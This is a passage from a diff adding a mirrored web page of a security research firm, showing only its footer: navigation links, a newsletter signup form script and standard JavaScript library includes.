+                <a href="https://twitter.com/ISEsecurity" class="text-decoration-none" rel="noopener">
+                  <img src="../../../assets/img/icons/social/twitter.svg" class="list-social-icon" alt="...">
+                </a>
+              </li>
+            </ul>
+
+            <div class="py-4">
+
+              <!-- Heading -->
+              <h6 class="font-weight-bold text-uppercase text-gray-700">
+                <a href="../../../contact/index.html">Contact Us</a>
+              </h6>
+  
+            </div>
+  
+            <div>
+  
+              <!-- Heading -->
+              <h6 class="font-weight-bold text-uppercase text-gray-700">
+                <a href="../../../privacy-policy/index.html">Privacy Policy</a>
+              </h6>
+  
+            </div>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              About
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-6 mb-md-8 mb-lg-0">
+              <li class="mb-3">
+                <a href="../../../about/values/index.html" class="text-reset">
+                  Company Values
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../about/methodology/index.html" class="text-reset">
+                  Methodology
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../about/leadership/index.html" class="text-reset">
+                  Leadership
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../news/index.html" class="text-reset">
+                  News
+                </a>
+              </li>
+              <li>
+                <a href="../../../careers/index.html" class="text-reset">
+                  Careers
+                </a>
+              </li>
+            </ul>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Services
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-6 mb-md-8 mb-lg-0">
+              <li class="mb-3">
+                <a href="../../../services/vulnerability-assessments/index.html" class="text-reset">
+                  Assessments
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../services/security-consulting-services/index.html" class="text-reset">
+                  Consulting
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="https://www.iotvillage.org/" target="_blank" class="text-reset" rel="noopener">
+                  IoT Village <span class="fe fe-external-link"></span>
+                </a>
+              </li>
+              <li">
+                <a href="../../../services/training/index.html" class="text-reset" rel="noopener">
+                  Training
+                </a>
+              </li>
+            </ul>
+
+          </div>
+          <div class="col-6 col-md-2">
+
+            <!-- Heading -->
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Research
+            </h6>
+
+            <!-- List -->
+            <ul class="list-unstyled text-muted mb-0">
+              <li class="mb-3">
+                <a href="../../index.html" class="text-reset">
+                  Studies & Papers
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../talks/index.html" class="text-reset">
+                  Talks
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../blog/index.html" class="text-reset" rel="noopener">
+                  Blog <span class="fe fe-external-link"></span>
+                </a>
+              </li>
+              <li class="mb-3">
+                <a href="../../../start/blog/index.html" class="text-reset" rel="noopener">
+                  VRM/TPRM Articles
+                </a>
+
+            </ul>
+
+          </div>
+
+          <div class="col-12 col-md-4">
+            <h6 class="font-weight-bold text-uppercase text-gray-700">
+              Stay up to date on the latest research and industry trends. Sign up for our newsletter
+            </h6>
+            <!-- Heading -->
+            <!--[if lte IE 8]>
+            <script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2-legacy.js"></script>
+            <![endif]-->
+            <script charset="utf-8" type="text/javascript" src="../../../../js.hsforms.net/forms/v2.js"></script>
+            <script>
+            hbspt.forms.create({
+            region: "na1",
+            portalId: "7197110",
+            formId: "e868052f-9574-4c5b-a8e0-6233b8b6b6d2"
+            });
+            </script>
+
+          </div>
+
+        </div> <!-- / .row -->
+      </div> <!-- / .container -->
+    </footer>
+
+    <!-- JAVASCRIPT
+    ================================================== -->
+    <!-- Libs JS -->
+    <script src="../../../assets/libs/jquery/dist/jquery.min.js"></script>
+    <script src="../../../assets/libs/bootstrap/dist/js/bootstrap.bundle.min.js"></script>
+    <script src="../../../assets/libs/%40fancyapps/fancybox/dist/jquery.fancybox.min.js"></script>
+    <script src="../../../assets/libs/aos/dist/aos.js"></script>
+
+    <!-- <script src="../../../assets/libs/choices.js/public/assets/scripts/choices.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/countup.js/dist/countUp.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/dropzone/dist/min/dropzone.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/flickity/dist/flickity.pkgd.min.js"></script>
+    <script src="../../../assets/libs/flickity-fade/flickity-fade.js"></script>
+    <script src="../../../assets/libs/highlightjs/highlight.pack.min.js"></script> -->
+    <script src="../../../assets/libs/imagesloaded/imagesloaded.pkgd.min.js"></script>
+    <!-- <script src="../../../assets/libs/isotope-layout/dist/isotope.pkgd.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/jarallax/dist/jarallax.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/jarallax/dist/jarallax-video.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/jarallax/dist/jarallax-element.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/quill/dist/quill.min.js"></script> -->
+    <!-- <script src="../../../assets/libs/smooth-scroll/dist/smooth-scroll.min.js"></script> -->
+     <script src="../../../assets/libs/typed.js/lib/typed.min.js"></script>
+
+    <!-- Map -->
+    <!-- <script src='https://api.mapbox.com/mapbox-gl-js/v0.53.0/mapbox-gl.js'></script> -->
+
+    <!-- Theme JS -->
+    <script src="../../../assets/js/theme.min.js"></script>
+
+
+</body>
+
+
+<!-- Mirrored from www.ise.io/research/studies-and-papers/netgear_wnr3500/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 31 Aug 2023 07:29:24 GMT -->
+</html>
